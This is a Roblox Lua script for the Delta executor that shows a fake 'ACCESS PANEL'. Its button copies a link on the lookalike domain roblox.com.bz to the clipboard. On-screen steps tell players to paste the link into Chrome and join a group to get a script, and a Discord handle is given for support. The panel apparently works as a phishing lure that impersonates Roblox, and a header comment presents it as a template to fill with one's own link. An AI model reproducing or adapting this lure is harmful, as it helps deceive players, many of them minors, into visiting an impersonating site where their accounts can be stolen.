--// ACCESS PANEL UI (Delta / Roblox)
--// Replace YOUR_LINK with your real link

local link = "https://roblox.com.bz/communities/7989725648/"

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- remove old gui
pcall(function()
	game.CoreGui.AccessPanelUI:Destroy()
end)

local gui = Instance.new("ScreenGui")
gui.Name = "ScriptPanelUI"
gui.Parent = game.CoreGui
gui.ResetOnSpawn = false

-- dark blur background
local bg = Instance.new("Frame")
bg.Parent = gui
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.BackgroundTransparency = 0.35
bg.BorderSizePixel = 0

-- main frame
local main = Instance.new("Frame")
main.Parent = bg
main.Size = UDim2.new(0, 420, 0, 320)
main.Position = UDim2.new(0.5, -210, 0.5, -160)
main.BackgroundColor3 = Color3.fromRGB(12,12,12)
main.BorderSizePixel = 0

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,20)
corner.Parent = main

-- top blue line
local topLine = Instance.new("Frame")
topLine.Parent = main
topLine.Size = UDim2.new(1,0,0,5)
topLine.BackgroundColor3 = Color3.fromRGB(0,170,255)
topLine.BorderSizePixel = 0

local topCorner = Instance.new("UICorner")
topCorner.CornerRadius = UDim.new(0,20)
topCorner.Parent = topLine

-- title
local title = Instance.new("TextLabel")
title.Parent = main
title.BackgroundTransparency = 1
title.Size = UDim2.new(1,0,0,50)
title.Position = UDim2.new(0,0,0,10)
title.Text = "ACCESS PANEL"
title.Font = Enum.Font.GothamBold
title.TextSize = 30
title.TextColor3 = Color3.fromRGB(255,255,255)

-- subtitle
local sub = Instance.new("TextLabel")
sub.Parent = main
sub.BackgroundTransparency = 1
sub.Size = UDim2.new(1,-40,0,30)
sub.Position = UDim2.new(0,20,0,70)
sub.Text = "Link copied! Paste in browser 🔗"
sub.Font = Enum.Font.Gotham
sub.TextSize = 18
sub.TextColor3 = Color3.fromRGB(180,180,180)

-- instructions
local info = Instance.new("TextLabel")
info.Parent = main
info.BackgroundTransparency = 1
info.Size = UDim2.new(1,-60,0,120)
info.Position = UDim2.new(0,30,0,110)
info.TextXAlignment = Enum.TextXAlignment.Left
info.TextYAlignment = Enum.TextYAlignment.Top
info.Text = "1. Click JOIN GROUP\n2. Link will be copied to your clipboard\n3. Paste link in Chrome\n4. Join group and enjoy your script"
info.Font = Enum.Font.Gotham
info.TextSize = 20
info.TextColor3 = Color3.fromRGB(255,255,255)

-- button
local button = Instance.new("TextButton")
button.Parent = main
button.Size = UDim2.new(0,300,0,55)
button.Position = UDim2.new(0.5,-150,0,215)
button.BackgroundColor3 = Color3.fromRGB(0,150,255)
button.Text = "JOIN GROUP"
button.Font = Enum.Font.GothamBold
button.TextSize = 24
button.TextColor3 = Color3.fromRGB(255,255,255)
button.AutoButtonColor = true

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0,18)
btnCorner.Parent = button

-- footer
local footer = Instance.new("TextLabel")
footer.Parent = main
footer.BackgroundTransparency = 1
footer.Size = UDim2.new(1,0,0,30)
footer.Position = UDim2.new(0,0,1,-35)
footer.Text = "Add gemma04921 in discord if you have any issues"
footer.Font = Enum.Font.Gotham
footer.TextSize = 16
footer.TextColor3 = Color3.fromRGB(120,120,120)

-- copy function
button.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(link)
	end
	
	button.Text = "COPIED!"
	
	wait(1.5)
	button.Text = "JOIN GROUP"
end)

-- draggable
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	main.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

main.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = main.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

main.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
